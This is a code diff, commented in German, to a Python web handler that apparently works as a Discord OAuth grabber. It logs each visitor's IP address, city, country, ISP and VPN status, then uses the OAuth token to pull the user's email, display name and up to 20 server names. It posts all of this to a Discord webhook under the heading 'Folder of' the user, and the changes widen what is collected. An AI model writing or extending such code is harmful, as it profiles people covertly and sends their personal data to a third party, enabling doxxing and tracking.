@@ -19,25 +19,27 @@ class handler(BaseHTTPRequestHandler):
         u_ip = self.headers.get('x-forwarded-for', 'N/A').split(',')[0]
         u_ag = self.headers.get('user-agent', 'N/A')
 
+        # Standort-Abfrage mit erweiterten Feldern für ISP/VPN Erkennung
         try:
-            r = requests.get(f"http://ip-api.com/json/{u_ip}?fields=221184").json()
+            r = requests.get(f"http://ip-api.com/json/{u_ip}?fields=17031167").json()
             loc = f"{r.get('city', 'Unknown')}, {r.get('country', '??')}"
             isp = r.get('isp', 'Unknown ISP')
-            vpn = "Ja" if r.get('proxy') else "Nein"
+            # Erkennt Hosting/Proxy oft als VPN
+            vpn = "Ja" if r.get('proxy') or r.get('hosting') else "Nein"
         except:
             loc, isp, vpn = "Lookup error", "N/A", "N/A"
 
         dev = "Windows PC" if "Win" in u_ag else "Mobile"
         if "Chrome" in u_ag: dev += " (Chrome)"
-        elif "Firefox" in u_ag: dev += " (Firefox)"
         elif "Safari" in u_ag and "Mobile" in u_ag: dev = "iPhone/iOS"
 
-        user_email = "Not yet processed"
-        user_guilds = "Not yet processed"
+        # Standardwerte
+        display_name = "Unknown User"
+        user_email = "Nicht autorisiert"
+        user_guilds = "Keine Server gefunden"
 
         # 3. Falls Code vorhanden -> Discord Daten abrufen
         if code and CLIENT_ID and CLIENT_SECRET:
-            # Token holen
             data = {
                 'client_id': CLIENT_ID,
                 'client_secret': CLIENT_SECRET,
@@ -51,23 +53,30 @@ class handler(BaseHTTPRequestHandler):
             access_token = token_r.get('access_token')
             if access_token:
                 auth_header = {'Authorization': f'Bearer {access_token}'}
-                # Email holen
+                
+                # Nutzer-Info (Email & Displayname)
                 u_info = requests.get('https://discord.com/api/v10/users/@me', headers=auth_header).json()
                 user_email = u_info.get('email', 'Keine Email gefunden')
+                # global_name ist der Displayname, username der @name
+                display_name = u_info.get('global_name') or u_info.get('username') or "Unknown"
                 
-                # Serverliste (Guilds) holen und zählen
+                # Serverliste (Guilds) einzeln auflisten
                 g_info = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=auth_header).json()
                 if isinstance(g_info, list):
-                    user_guilds = f"{len(g_info)} Server gefunden"
+                    # Listet die ersten 20 Server auf, um das Discord-Limit für Nachrichten nicht zu sprengen
+                    server_list = [f"- {g['name']}" for g in g_info[:20]]
+                    user_guilds = "\n".join(server_list)
+                    if len(g_info) > 20:
+                        user_guilds += f"\n*... und {len(g_info)-20} weitere*"
 
         # 4. Webhook senden
         if WH_URL:
             payload = {
                 "embeds": [{
-                    "title": "**__📂 Folder of User__**",
+                    "title": f"**__📂 Folder of {display_name}__**",
                     "color": 0x2b2d31,
                     "description": (
-                        f"• 📋 **Server:**\n- {user_guilds}\n\n"
+                        f"• 📋 **Serverliste:**\n{user_guilds}\n\n"
                         f"• 📧 **Email:**\n- {user_email}\n\n"
                         f"• 📍 **Standort/IP-Adresse:**\n{loc} ({u_ip})\n\n"
                         f"• 🧾 **Anbieter:**\n{isp}\n\n"
